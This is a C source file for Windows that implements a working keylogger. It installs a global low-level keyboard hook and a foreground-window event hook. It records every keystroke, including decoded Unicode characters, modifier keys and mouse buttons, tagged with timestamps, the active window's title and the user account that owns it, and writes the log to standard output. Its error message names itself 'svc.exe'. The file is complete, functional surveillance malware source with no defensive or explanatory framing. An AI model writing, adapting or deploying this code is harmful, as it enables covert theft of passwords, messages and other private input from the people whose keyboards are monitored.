#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winuser.h>
#include <tlhelp32.h>
#include <Strsafe.h>
#include <stdlib.h>
#include <locale.h>
#include <wingdi.h>
#define REEF(x){ if (x){ free(x); x = NULL;}}

HHOOK winHook;
HWND gh_hwndMain;
BOOL foregroundWindowChanged;
char foregroundWindowTitle[4096];

int PrintError(void)
{
    int err = GetLastError();
    int sz;
    char buf[512];

    sz = FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        err,
        0,
        buf,
        512,
        NULL );
    if (!sz)//the error is not known
    {
        printf("Unknown error.\n");
        return ERROR;
    }
    printf("Error svc.exe %d : %hs\n", err, buf);
    return ERROR;
}


VOID LogvKey(INT vKey, INT MODE)
{
    if (MODE == 0)
    {
        switch(vKey) {
            case VK_LBUTTON:
                printf("[Left mouse button]");
                break;
            case VK_RBUTTON:
                printf("[Right mouse button]");
                break;
            case VK_CANCEL:
                printf("[Control-break processing]");
                break;
            case VK_MBUTTON:
                printf("[Middle mouse button]");
                break;
            case VK_XBUTTON1:
                printf("[X1 mouse button]");
                break;
            case VK_XBUTTON2:
                printf("[X2 mouse button]");
                break;
            case VK_BACK:
                printf("[Backspace]");
                break;
            case VK_TAB:
                printf("\\t");
                break;
            case VK_CLEAR:
                printf("[Clear]");
                break;
            case VK_RETURN:
                printf("\\n");
                break;
            case VK_SHIFT:
                printf("[Shift]");
                break;
            case VK_CONTROL:
                printf("[Ctrl]");
                break;
            case VK_MENU:
                printf("[Alt]");
                break;
            case VK_PAUSE:
                printf("[Pause]");
                break;
            case VK_CAPITAL:
                printf("[Caps lock]");
                break;
            case VK_HANGUL:
                printf("[IME Kana/Hangul mode]");
                break;
            case VK_IME_ON:
                printf("[IME On]");
                break;
            case VK_JUNJA:
                printf("[IME Junja mode]");
                break;
            case VK_FINAL:
                printf("[IME final mode]");
                break;
            case VK_KANJI:
                printf("[IME Kanji/Hanja mode]");
                break;
            case VK_IME_OFF:
                printf("[IME Off]");
                break;
            case VK_ESCAPE:
                printf("[Esc]");
                break;
            case VK_CONVERT:
                printf("[IME convert]");
                break;
            case VK_NONCONVERT:
                printf("[IME nonconvert]");
                break;
            case VK_ACCEPT:
                printf("[IME accept]");
                break;
            case VK_MODECHANGE:
                printf("[IME mode change request]");
                break;
            case VK_PRIOR:
                printf("[Page up]");
                break;
            case VK_NEXT:
                printf("[Page down]");
                break;
            case VK_END:
                printf("[End]");
                break;
            case VK_HOME:
                printf("[Home]");
                break;
            case VK_LEFT:
                printf("[Left arrow]");
                break;
            case VK_UP:
                printf("[Up arrow]");
                break;
            case VK_RIGHT:
                printf("[Right arrow]");
                break;
            case VK_DOWN:
                printf("[Down arrow]");
                break;
            case VK_SELECT:
                printf("[Select]");
                break;
            case VK_PRINT:
                printf("[Print]");
                break;
            case VK_EXECUTE:
                printf("[Execute]");
                break;
            case VK_SNAPSHOT:
                printf("[Print screen]");
                break;
            case VK_INSERT:
                printf("[Insert]");
                break;
            case VK_DELETE:
                printf("[Delete]");
                break;
            case VK_HELP:
                printf("[Help]");
                break;
            case VK_LWIN:
                printf("[Left Windows logo]");
                break;
            case VK_RWIN:
                printf("[Right Windows logo]");
                break;
            case VK_APPS:
                printf("[Application]");
                break;
            case VK_SLEEP:
                printf("[Computer Sleep]");
                break;
            case VK_DIVIDE:
                printf("[Divide]");
                break;
            case VK_F1:
                printf("[F1]");
                break;
            case VK_F2:
                printf("[F2]");
                break;
            case VK_F3:
                printf("[F3]");
                break;
            case VK_F4:
                printf("[F4]");
                break;
            case VK_F5:
                printf("[F5]");
                break;
            case VK_F6:
                printf("[F6]");
                break;
            case VK_F7:
                printf("[F7]");
                break;
            case VK_F8:
                printf("[F8]");
                break;
            case VK_F9:
                printf("[F9]");
                break;
            case VK_F10:
                printf("[F10]");
                break;
            case VK_F11:
                printf("[F11]");
                break;
            case VK_F12:
                printf("[F12]");
                break;
            case VK_F13:
                printf("[F13]");
                break;
            case VK_F14:
                printf("[F14]");
                break;
            case VK_F15:
                printf("[F15]");
                break;
            case VK_F16:
                printf("[F16]");
                break;
            case VK_F17:
                printf("[F17]");
                break;
            case VK_F18:
                printf("[F18]");
                break;
            case VK_F19:
                printf("[F19]");
                break;
            case VK_F20:
                printf("[F20]");
                break;
            case VK_F21:
                printf("[F21]");
                break;
            case VK_F22:
                printf("[F22]");
                break;
            case VK_F23:
                printf("[F23]");
                break;
            case VK_F24:
                printf("[F24]");
                break;
            case VK_NUMLOCK:
                printf("[Num lock]");
                break;
            case VK_SCROLL:
                printf("[Scroll lock]");
                break;
            case VK_LSHIFT:
                printf("[Left Shift]");
                break;
            case VK_RSHIFT:
                printf("[Right Shift]");
                break;
            case VK_LCONTROL:
                printf("[Left Ctrl]");
                break;
            case VK_RCONTROL:
                printf("[Right Ctrl]");
                break;
            case VK_LMENU:
                printf("[Left Alt]");
                break;
            case VK_RMENU:
                printf("[Right Alt]");
                break;
            case VK_BROWSER_BACK:
                printf("[Browser Back]");
                break;
            case VK_BROWSER_FORWARD:
                printf("[Browser Forward]");
                break;
            case VK_BROWSER_REFRESH:
                printf("[Browser Refresh]");
                break;
            case VK_BROWSER_STOP:
                printf("[Browser Stop]");
                break;
            case VK_BROWSER_SEARCH:
                printf("[Browser Search]");
                break;
            case VK_BROWSER_FAVORITES:
                printf("[Browser Favorites]");
                break;
            case VK_BROWSER_HOME:
                printf("[Browser Start and Home]");
                break;
            case VK_VOLUME_MUTE:
                printf("[Volume Mute]");
                break;
            case VK_VOLUME_DOWN:
                printf("[Volume Down]");
                break;
            case VK_VOLUME_UP:
                printf("[Volume Up]");
                break;
            case VK_MEDIA_NEXT_TRACK:
                printf("[Next Track]");
                break;
            case VK_MEDIA_PREV_TRACK:
                printf("[Previous Track]");
                break;
            case VK_MEDIA_STOP:
                printf("[Stop Media]");
                break;
            case VK_MEDIA_PLAY_PAUSE:
                printf("[Play/Pause Media]");
                break;
            case VK_LAUNCH_MAIL:
                printf("[Start Mail]");
                break;
            case VK_LAUNCH_MEDIA_SELECT:
                printf("[Select Media]");
                break;
            case VK_LAUNCH_APP1:
                printf("[Start Application 1]");
                break;
            case VK_LAUNCH_APP2:
                printf("[Start Application 2]");
                break;
            case VK_PROCESSKEY:
                printf("[IME PROCESS]");
                break;
            case VK_PACKET:
                printf("[Unicode characters]");
                break;
            case VK_ATTN:
                printf("[Attn]");
                break;
            case VK_CRSEL:
                printf("[CrSel]");
                break;
            case VK_EXSEL:
                printf("[ExSel]");
                break;
            case VK_EREOF:
                printf("[Erase EOF]");
                break;
            case VK_PLAY:
                printf("[Play]");
                break;
            case VK_ZOOM:
                printf("[Zoom]");
                break;
            case VK_NONAME:
                printf("[Reserved]");
                break;
            case VK_PA1:
                printf("[PA1]");
                break;
            case VK_OEM_CLEAR:
                printf("[Clear]");
                break;
            default:
                break;
        }
    }
    else
    {
        switch(vKey) {
            case VK_LBUTTON:
                printf("[Left mouse button]");
                break;
            case VK_RBUTTON:
                printf("[Right mouse button]");
                break;
            case VK_CANCEL:
                printf("[Control-break processing]");
                break;
            case VK_MBUTTON:
                printf("[Middle mouse button]");
                break;
            case VK_XBUTTON1:
                printf("[X1 mouse button]");
                break;
            case VK_XBUTTON2:
                printf("[X2 mouse button]");
                break;
            case VK_BACK:
                printf("[Backspace]");
                break;
            case VK_TAB:
                printf("\\t");
                break;
            case VK_CLEAR:
                printf("[Clear]");
                break;
            case VK_RETURN:
                printf("\\n");
                break;
            case VK_SHIFT:
                printf("[Shift]");
                break;
            case VK_CONTROL:
                printf("[Ctrl]");
                break;
            case VK_MENU:
                printf("[Alt]");
                break;
            case VK_PAUSE:
                printf("[Pause]");
                break;
            case VK_CAPITAL:
                printf("[Caps lock]");
                break;
            case VK_HANGUL:
                printf("[IME Kana/Hangul mode]");
                break;
            case VK_IME_ON:
                printf("[IME On]");
                break;
            case VK_JUNJA:
                printf("[IME Junja mode]");
                break;
            case VK_FINAL:
                printf("[IME final mode]");
                break;
            case VK_KANJI:
                printf("[IME Kanji/Hanja mode]");
                break;
            case VK_IME_OFF:
                printf("[IME Off]");
                break;
            case VK_ESCAPE:
                printf("[Esc]");
                break;
            case VK_CONVERT:
                printf("[IME convert]");
                break;
            case VK_NONCONVERT:
                printf("[IME nonconvert]");
                break;
            case VK_ACCEPT:
                printf("[IME accept]");
                break;
            case VK_MODECHANGE:
                printf("[IME mode change request]");
                break;
            case VK_SPACE:
                printf("[Spacebar]");
                break;
            case VK_PRIOR:
                printf("[Page up]");
                break;
            case VK_NEXT:
                printf("[Page down]");
                break;
            case VK_END:
                printf("[End]");
                break;
            case VK_HOME:
                printf("[Home]");
                break;
            case VK_LEFT:
                printf("[Left arrow]");
                break;
            case VK_UP:
                printf("[Up arrow]");
                break;
            case VK_RIGHT:
                printf("[Right arrow]");
                break;
            case VK_DOWN:
                printf("[Down arrow]");
                break;
            case VK_SELECT:
                printf("[Select]");
                break;
            case VK_PRINT:
                printf("[Print]");
                break;
            case VK_EXECUTE:
                printf("[Execute]");
                break;
            case VK_SNAPSHOT:
                printf("[Print screen]");
                break;
            case VK_INSERT:
                printf("[Insert]");
                break;
            case VK_DELETE:
                printf("[Delete]");
                break;
            case VK_HELP:
                printf("[Help]");
                break;
            case VK_LWIN:
                printf("[Left Windows logo]");
                break;
            case VK_RWIN:
                printf("[Right Windows logo]");
                break;
            case VK_APPS:
                printf("[Application]");
                break;
            case VK_SLEEP:
                printf("[Computer Sleep]");
                break;
                case 'A':
                printf("[A]");
                break;
            case 'B':
                printf("[B]");
                break;
            case 'C':
                printf("[C]");
                break;
            case 'D':
                printf("[D]");
                break;
            case 'E':
                printf("[E]");
                break;
            case 'F':
                printf("[F]");
                break;
            case 'G':
                printf("[G]");
                break;
            case 'H':
                printf("[H]");
                break;
            case 'I':
                printf("[I]");
                break;
            case 'J':
                printf("[J]");
                break;
            case 'K':
                printf("[K]");
                break;
            case 'L':
                printf("[L]");
                break;
            case 'M':
                printf("[M]");
                break;
            case 'N':
                printf("[N]");
                break;
            case 'O':
                printf("[O]");
                break;
            case 'P':
                printf("[P]");
                break;
            case 'Q':
                printf("[Q]");
                break;
            case 'R':
                printf("[R]");
                break;
            case 'S':
                printf("[S]");
                break;
            case 'T':
                printf("[T]");
                break;
            case 'U':
                printf("[U]");
                break;
            case 'V':
                printf("[V]");
                break;
            case 'W':
                printf("[W]");
                break;
            case 'X':
                printf("[X]");
                break;
            case 'Y':
                printf("[Y]");
                break;
            case 'Z':
                printf("[Z]");
                break;
            case VK_NUMPAD0:
                printf("[Numeric keypad 0]");
                break;
            case VK_NUMPAD1:
                printf("[Numeric keypad 1]");
                break;
            case VK_NUMPAD2:
                printf("[Numeric keypad 2]");
                break;
            case VK_NUMPAD3:
                printf("[Numeric keypad 3]");
                break;
            case VK_NUMPAD4:
                printf("[Numeric keypad 4]");
                break;
            case VK_NUMPAD5:
                printf("[Numeric keypad 5]");
                break;
            case VK_NUMPAD6:
                printf("[Numeric keypad 6]");
                break;
            case VK_NUMPAD7:
                printf("[Numeric keypad 7]");
                break;
            case VK_NUMPAD8:
                printf("[Numeric keypad 8]");
                break;
            case VK_NUMPAD9:
                printf("[Numeric keypad 9]");
                break;
            case VK_MULTIPLY:
                printf("[Multiply]");
                break;
            case VK_ADD:
                printf("[Add]");
                break;
            case VK_SEPARATOR:
                printf("[Separator]");
                break;
            case VK_SUBTRACT:
                printf("[Subtract]");
                break;
            case VK_DECIMAL:
                printf("[Decimal]");
                break;
            case VK_DIVIDE:
                printf("[Divide]");
                break;
            case VK_F1:
                printf("[F1]");
                break;
            case VK_F2:
                printf("[F2]");
                break;
            case VK_F3:
                printf("[F3]");
                break;
            case VK_F4:
                printf("[F4]");
                break;
            case VK_F5:
                printf("[F5]");
                break;
            case VK_F6:
                printf("[F6]");
                break;
            case VK_F7:
                printf("[F7]");
                break;
            case VK_F8:
                printf("[F8]");
                break;
            case VK_F9:
                printf("[F9]");
                break;
            case VK_F10:
                printf("[F10]");
                break;
            case VK_F11:
                printf("[F11]");
                break;
            case VK_F12:
                printf("[F12]");
                break;
            case VK_F13:
                printf("[F13]");
                break;
            case VK_F14:
                printf("[F14]");
                break;
            case VK_F15:
                printf("[F15]");
                break;
            case VK_F16:
                printf("[F16]");
                break;
            case VK_F17:
                printf("[F17]");
                break;
            case VK_F18:
                printf("[F18]");
                break;
            case VK_F19:
                printf("[F19]");
                break;
            case VK_F20:
                printf("[F20]");
                break;
            case VK_F21:
                printf("[F21]");
                break;
            case VK_F22:
                printf("[F22]");
                break;
            case VK_F23:
                printf("[F23]");
                break;
            case VK_F24:
                printf("[F24]");
                break;
            case VK_NUMLOCK:
                printf("[Num lock]");
                break;
            case VK_SCROLL:
                printf("[Scroll lock]");
                break;
            case VK_LSHIFT:
                printf("[Left Shift]");
                break;
            case VK_RSHIFT:
                printf("[Right Shift]");
                break;
            case VK_LCONTROL:
                printf("[Left Ctrl]");
                break;
            case VK_RCONTROL:
                printf("[Right Ctrl]");
                break;
            case VK_LMENU:
                printf("[Left Alt]");
                break;
            case VK_RMENU:
                printf("[Right Alt]");
                break;
            case VK_BROWSER_BACK:
                printf("[Browser Back]");
                break;
            case VK_BROWSER_FORWARD:
                printf("[Browser Forward]");
                break;
            case VK_BROWSER_REFRESH:
                printf("[Browser Refresh]");
                break;
            case VK_BROWSER_STOP:
                printf("[Browser Stop]");
                break;
            case VK_BROWSER_SEARCH:
                printf("[Browser Search]");
                break;
            case VK_BROWSER_FAVORITES:
                printf("[Browser Favorites]");
                break;
            case VK_BROWSER_HOME:
                printf("[Browser Start and Home]");
                break;
            case VK_VOLUME_MUTE:
                printf("[Volume Mute]");
                break;
            case VK_VOLUME_DOWN:
                printf("[Volume Down]");
                break;
            case VK_VOLUME_UP:
                printf("[Volume Up]");
                break;
            case VK_MEDIA_NEXT_TRACK:
                printf("[Next Track]");
                break;
            case VK_MEDIA_PREV_TRACK:
                printf("[Previous Track]");
                break;
            case VK_MEDIA_STOP:
                printf("[Stop Media]");
                break;
            case VK_MEDIA_PLAY_PAUSE:
                printf("[Play/Pause Media]");
                break;
            case VK_LAUNCH_MAIL:
                printf("[Start Mail]");
                break;
            case VK_LAUNCH_MEDIA_SELECT:
                printf("[Select Media]");
                break;
            case VK_LAUNCH_APP1:
                printf("[Start Application 1]");
                break;
            case VK_LAUNCH_APP2:
                printf("[Start Application 2]");
                break;
            case VK_OEM_1:
                printf("[;:]");
                break;
            case VK_OEM_PLUS:
                printf("[+]");
                break;
            case VK_OEM_COMMA:
                printf("[,]");
                break;
            case VK_OEM_MINUS:
                printf("[-]");
                break;
            case VK_OEM_PERIOD:
                printf("[.]");
                break;
            case VK_OEM_2:
                printf("[/?]");
                break;
            case VK_OEM_3:
                printf("[`~]");
                break;
            case VK_OEM_4:
                printf("[[{]");
                break;
            case VK_OEM_5:
                printf("[\\|]");
                break;
            case VK_OEM_6:
                printf("[]}]");
                break;
            case VK_OEM_7:
                printf("['\"]");
                break;
            case VK_OEM_8:
                printf("[miscellaneous characters]");
                break;
            case VK_OEM_102:
                printf("[<> keys]");
                break;
            case VK_PROCESSKEY:
                printf("[IME PROCESS]");
                break;
            case VK_PACKET:
                printf("[Unicode characters]");
                break;
            case VK_ATTN:
                printf("[Attn]");
                break;
            case VK_CRSEL:
                printf("[CrSel]");
                break;
            case VK_EXSEL:
                printf("[ExSel]");
                break;
            case VK_EREOF:
                printf("[Erase EOF]");
                break;
            case VK_PLAY:
                printf("[Play]");
                break;
            case VK_ZOOM:
                printf("[Zoom]");
                break;
            case VK_NONAME:
                printf("[Reserved]");
                break;
            case VK_PA1:
                printf("[PA1]");
                break;
            case VK_OEM_CLEAR:
                printf("[Clear]");
                break;
            default:
                break;
        }
    }

}

VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID)
{
    HANDLE foregroundWindowProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, foregroundWindowPID);
    TOKEN_USER tokenUser;
    HANDLE hToken;
    DWORD dwSize;

    if (foregroundWindowProcessHandle == NULL)
        goto END;
    if (!OpenProcessToken(foregroundWindowProcessHandle, TOKEN_QUERY, &hToken))
        goto END;
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
        PTOKEN_USER pTokenUser = malloc(dwSize);
    if (pTokenUser == NULL)
        goto END;
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
        {
            strncpy_s(username, 4096, domain, _TRUNCATE);//_countof is a macro, _TRUNCATE will truncate the string if dst is too small
            strncat_s(username, 4096, "\\", _TRUNCATE);
            strncat_s(username, 4096, name, _TRUNCATE);
        }
        else
        {
            REEF(pTokenUser);
            goto END;
        }
    }
    REEF(pTokenUser);
    return;
END:
    strncpy_s(username, strlen("[USERNAME LOOKUP FAILED]"), "[USERNAME LOOKUP FAILED]", _TRUNCATE);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode < 0 ||( wParam != WM_KEYDOWN &&  wParam != WM_SYSKEYDOWN && wParam != WM_SYSKEYUP && wParam != WM_KEYUP))  // do not process message if nCode < 0
        return CallNextHookEx(winHook, nCode, wParam, lParam); 
    PKBDLLHOOKSTRUCT keyInfos = (PKBDLLHOOKSTRUCT)lParam;// struct qui contient les informations concernant la frappe.
    HWND foregroundWindow =  GetForegroundWindow();
    DWORD foregroundWindowPID;
    DWORD foregroundWindowTID = GetWindowThreadProcessId(foregroundWindow, &foregroundWindowPID);
    WCHAR keyByte[5] = {0};//for unicode we may need more than 1 byte
    BYTE keyState[256] = {0};
    DWORD currentTid = GetCurrentThreadId();
    HKL keyboardLayout = GetKeyboardLayout(foregroundWindowTID);
    INT res = 0;
    char foregroundWindowUsername[4096];

    if (foregroundWindowChanged)
    {
        foregroundWindowChanged = FALSE;
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        GetUsernameOfForegroundWindow(foregroundWindowUsername, foregroundWindowPID);
        printf("\n[%02d/%02d/%d %02d:%02d:%02d][Foreground window's user : %s][Foreground window's title : %s]\n", \
            lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond, foregroundWindowUsername,  foregroundWindowTitle);
    }
    // We need to set ourself the keyState because we are in KEYBOARD_LL mode which capture keys BEFORE the target thread receive the key
    // GetKeyBoardState do not work because it gets the state after us, not in the same time. There is no GetAsyncKeyboardState unfortunatly.
    for (int i = 0; i <= 255; i++)
    {
        if (GetAsyncKeyState(i) & 0x8000)
            keyState[i] = 0x80; 
        else if (GetAsyncKeyState(i) & 0x1)
            keyState[i] = 0x1;
    }
    if (wParam != WM_KEYUP)
        LogvKey(keyInfos->vkCode, 0);
    if (keyState[VK_CONTROL] != 0X80 && keyState[VK_MENU] != 0X80)
        res = ToUnicodeEx(keyInfos->vkCode, keyInfos->scanCode, keyState, (LPWSTR)&keyByte, 4, 0x4, keyboardLayout);
    else if ((keyState[VK_CONTROL] == 0X80 || keyState[VK_MENU] == 0X80) && wParam != WM_KEYUP)
        LogvKey(keyInfos->vkCode, 1);
    if (res > 0 && wParam != WM_KEYUP)
        printf("%ws", keyByte);
    fflush(NULL);
    return CallNextHookEx(winHook, nCode, wParam, lParam);
}

void GetWindowTitle(HWND hwnd)
{
    if (hwnd == NULL)
    {
        strcpy_s(foregroundWindowTitle, 4096, "[GetWinTitle Failed]");
        return;
    }
    int windowTitleLen = GetWindowTextLength(hwnd);
    if (windowTitleLen > 4095)
        windowTitleLen = 4095;
    GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
    foregroundWindowChanged = TRUE;
}

LRESULT CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD idEventThread, DWORD dwmsEventTime)
{
    GetWindowTitle(hwnd);
}   

int main(void)
{
    winHook = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    HWINEVENTHOOK winEvt = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
    foregroundWindowChanged = TRUE;
    GetWindowTitle(GetForegroundWindow());
    if (winHook == NULL || winEvt == NULL)
        exit(1);
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(winHook);
    UnhookWinEvent(winEvt);
}